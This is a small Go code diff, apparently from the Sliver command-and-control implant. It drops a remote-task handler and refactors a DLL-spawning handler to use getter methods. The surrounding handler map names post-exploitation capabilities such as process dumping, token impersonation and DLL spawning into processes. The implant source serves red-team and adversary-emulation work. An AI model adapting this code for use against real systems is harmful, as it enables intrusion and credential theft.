@@ -36,7 +36,6 @@ var (
 	windowsHandlers = map[uint32]RPCHandler{
 		// Windows Only
 		sliverpb.MsgTaskReq:            taskHandler,
-		sliverpb.MsgRemoteTaskReq:      remoteTaskHandler,
 		sliverpb.MsgProcessDumpReq:     dumpHandler,
 		sliverpb.MsgImpersonateReq:     impersonateHandler,
 		sliverpb.MsgRevToSelf:          revToSelfHandler,
@@ -214,9 +213,9 @@ func spawnDllHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	//{{if .Debug}}
-	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.ProcName, spawnReq.Offset, spawnReq.Args)
+	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.GetProcessName(), spawnReq.GetOffset(), spawnReq.GetArgs())
 	//{{end}}
-	result, err := taskrunner.SpawnDll(spawnReq.ProcName, spawnReq.Data, spawnReq.Offset, spawnReq.Args)
+	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs())
 	spawnResp := &sliverpb.SpawnDll{Result: result}
 	if err != nil {
 		spawnResp.Response = &commonpb.Response{
